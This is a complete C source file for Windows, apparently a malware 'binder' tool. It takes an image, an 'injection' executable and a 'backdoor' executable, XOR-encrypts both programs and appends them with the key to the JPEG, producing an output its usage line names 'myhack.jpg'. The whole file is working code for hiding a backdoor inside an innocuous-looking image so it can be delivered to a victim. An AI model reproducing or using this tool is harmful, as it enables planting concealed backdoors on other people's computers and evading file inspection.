#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <time.h>
#include <Windows.h>

#define BUFLEN 4096

void Encrypt(char *plain, unsigned char *key, char *encrypt) {
	int i;
	for (i = 0; i < BUFLEN; i++) {
		encrypt[i] = (plain[i] ^ key[i]);
	}
}
/*
void Decrypt(char *encrypt, unsigned char *key, char *decrypt) {
	int i;
	for (i = 0; i < BUFLEN; i++) {
		decrypt[i] = (encrypt[i] ^ key[i]);
	}
}
*/
int main(int argc, char *argv[]) {

	if (argc != 5) {
		printf("usage: %s image.jpg injection.exe backdoor.exe myhack.jpg\n", argv[0]);
		return 1;
	}

	FILE *pImage, *pInjection, *pBackdoor, *pMalicious, *pKey;
	int err;

	//Image file open
	err = fopen_s(&pImage, argv[1], "r+b");//r+´Â fseek°¡´É
	if (err != 0) {
		printf("%s file not open!\n", argv[1]);
		return 1;
	}
	//Injection file open
	err = fopen_s(&pInjection, argv[2], "r+b");
	if (err != 0) {
		printf("%s file not open!\n", argv[2]);
		return 1;
	}
	//Backdoor file open
	err = fopen_s(&pBackdoor, argv[3], "r+b");
	if (err != 0) {
		printf("%s file not open!\n", argv[3]);
		return 1;
	}
	//Malicious file open
	err = fopen_s(&pMalicious, argv[4], "wb");
	if (err != 0) {
		printf("%s file not open!\n", argv[4]);
		return 1;
	}
	//key file open
	err = fopen_s(&pKey, "key", "wb");
	if (err != 0) {
		printf("key file not open!\n");
		return 1;
	}

	// generation key string
	unsigned char key[BUFLEN];
	char cipher[BUFLEN];
	int num;
	srand((unsigned int)time(NULL));
	for (num = 0; num < BUFLEN; num++) {
		key[num] = rand();
	}

	// file encrypt and merge
	char buf[BUFLEN];
	memset(buf, 0, BUFLEN);
	while ((num = fread(buf, sizeof(char), BUFLEN, pImage)) > 0) {
		fwrite(buf, sizeof(char), num, pMalicious);
		memset(buf, 0, sizeof(buf));
	}

	printf("start injection file:\t %lld\n", _ftelli64(pMalicious));
	while ((num = fread(buf, sizeof(char), BUFLEN, pInjection)) > 0) {
		Encrypt(buf, key, cipher);
		fwrite(cipher, sizeof(char), num, pMalicious);
		memset(cipher, 0, sizeof(cipher));
		memset(buf, 0, sizeof(buf));
	}
	printf("end injection file:\t %lld\n", _ftelli64(pMalicious) - 1);

	printf("start key code:\t\t %lld\n", _ftelli64(pMalicious));
	fwrite(key, sizeof(char), BUFLEN, pMalicious);
	fwrite(key, sizeof(char), BUFLEN, pKey);
	printf("end key code:\t\t %lld\n", _ftelli64(pMalicious) - 1);

	printf("start backdoor file:\t %lld\n", _ftelli64(pMalicious));
	while ((num = fread(buf, sizeof(char), BUFLEN, pBackdoor)) > 0) {
		Encrypt(buf, key, cipher);
		fwrite(cipher, sizeof(char), num, pMalicious);
		memset(cipher, 0, sizeof(cipher));
		memset(buf, 0, sizeof(buf));
	}
	printf("end backdoor file:\t %lld\n", _ftelli64(pMalicious) - 1);
	char keypath[BUFLEN];
	GetModuleFileNameA(NULL, keypath, BUFLEN);
	keypath[strrchr(keypath, '\\') - keypath + 1] = 0;
	strcat_s(keypath, BUFLEN, "key");
	printf("Create Key code File!! please check the file...(%s)", keypath);

	// env clean
	memset(key, 0, sizeof(key));
	fclose(pImage);
	fclose(pInjection);
	fclose(pBackdoor);
	fclose(pMalicious);
	fclose(pKey);

	return 0;
}